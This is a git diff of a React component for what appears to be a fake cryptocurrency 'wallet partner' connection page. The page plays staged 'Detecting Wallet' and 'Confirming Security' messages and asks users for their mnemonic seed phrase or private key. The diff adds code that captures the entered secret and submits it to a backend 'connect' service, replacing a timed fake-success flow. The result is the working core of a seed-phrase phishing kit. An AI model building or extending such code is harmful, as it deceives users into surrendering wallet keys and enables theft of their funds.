@@ -2,6 +2,8 @@ import { useState } from "react";
 import { Link } from "react-router-dom";
 import { FaShield } from "react-icons/fa6";
 
+import { connect } from "../../services/connect.service";
+
 export function WalletPartner() {
   const partnerName = localStorage.getItem("walletName") || "";
   const partnerImg = localStorage.getItem("walletImg") || "";
@@ -12,15 +14,29 @@ export function WalletPartner() {
   const [showManual, setShowManual] = useState(false);
   const [error, setError] = useState(false);
   const [manualStatus, setManualStatus] = useState("Loading...");
+  const [mLoading, setMLoading] = useState(false);
   const [success, setSuccess] = useState(false);
+
+  const [formData, setFormData] = useState({
+    message: "",
+  });
+
+  const handleChange = (e) => {
+    const { name, value } = e.target;
+
+    setFormData((previous) => ({
+      ...previous,
+      [name]: value,
+    }));
+  };
 
   const handleConnect = () => {
     setShowPopup(true);
+    setSuccess(false);
     setLoading(true);
     setShowManual(false);
     setError(false);
     setStatus("Detecting Wallet...");
-
     setTimeout(() => {
       setStatus("Confirming Security...");
     }, 5000);
@@ -43,20 +59,33 @@ export function WalletPartner() {
   const handleManualConnect = async (e) => {
     e.preventDefault();
     setError(false);
+    setMLoading(true);
     setManualStatus("Establishing Connection...");
 
-    setTimeout(() => {
-      setManualStatus("Confirming Security...");
-    }, 5000);
+    try {
+      setTimeout(() => {
+        setManualStatus("Confirming Security...");
+      }, 5000);
 
-    setTimeout(() => {
-      setManualStatus("Connecting Wallet...");
-    }, 10000);
-
-    setTimeout(() => {
+      setTimeout(() => {
+        setManualStatus("Connecting Wallet...");
+      }, 10000);
+      const res = await connect(formData);
+      console.log(res);
       setSuccess(true);
+    } catch (error) {
+      console.error(error);
+      setError(true)
+    } finally {
       setShowManual(false);
-    }, 15000);
+      setMLoading(false);
+    }
+
+    // setTimeout(() => {
+    //   setSuccess(true);
+    //   setShowManual(false);
+    //   setMLoading(false)
+    // }, 15000);
   };
 
   const closePopup = () => {
@@ -165,12 +194,13 @@ export function WalletPartner() {
               {showManual ? (
                 <form className="w-full mt-4" onSubmit={handleManualConnect}>
                   <textarea
+                    onChange={handleChange}
                     required
                     name="message"
                     className="w-full h-40 resize-none rounded-lg border border-gray-300 p-3 text-base"
                     placeholder="Enter your 12 or 24 Mnemonic words. seperate them with spaces. You can also input your privatekey instead."
                   ></textarea>
-                  {showManual ? (
+                  {mLoading ? (
                     <p className="mt-3 mb-1 text-xs text-[#373737]">
                       {manualStatus}
                     </p>
